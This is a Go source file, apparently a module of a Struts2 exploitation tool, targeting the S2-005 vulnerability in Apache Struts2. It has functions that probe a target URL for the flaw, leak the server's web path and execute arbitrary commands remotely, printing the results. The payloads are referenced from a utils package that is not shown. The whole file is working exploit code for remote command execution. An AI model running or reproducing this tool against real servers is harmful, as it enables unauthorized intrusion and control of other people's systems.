package s005

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
	"log"
	"net/url"
	"strings"
)

func Check(targetUrl string){
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_check)
	if utils.IfContainsStr(respString,utils.Checkflag){
		color.Red("*Found Struts2-005！")
	}else {
		fmt.Println("Struts2-005 Not Vulnerable.")
	}
}
func GetWebPath(targetUrl string){
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_webpath)
	log.Println(respString)
}

func ExecCommand(targetUrl string,command string){
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_exec(command))
	tmpResult := strings.Replace(url.QueryEscape(respString),"%00","",-1)
	fmt.Println(url.QueryUnescape(tmpResult))
}